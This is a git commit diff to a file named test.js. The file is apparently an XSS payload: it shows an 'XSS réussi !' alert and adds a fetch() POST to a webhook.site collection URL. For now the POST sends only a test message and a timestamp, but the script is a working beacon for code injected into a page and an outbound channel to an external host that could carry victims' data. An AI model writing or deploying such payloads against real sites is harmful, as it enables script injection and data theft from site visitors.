35a0e7c8e2aa46656edf6c023bdd5193d3f8561a
chtipilou <90285314+chtipilou@users.noreply.github.com>
2025-03-09 18:00:03 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,2 +1,15 @@
 alert("XSS réussi !");
-console.log("Si tu vois ce message dans la console, c'est que le script a bien été exécuté !");
+
+fetch('https://webhook.site/33fc25fd-1bf0-4672-8f43-c6c083183e9f', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+        message: 'Test message from the XSS payload',
+        timestamp: new Date().toISOString()
+    })
+})
+.then(response => response.json())
+.then(data => console.log('Data sent:', data))
+.catch(error => console.error('Error:', error));
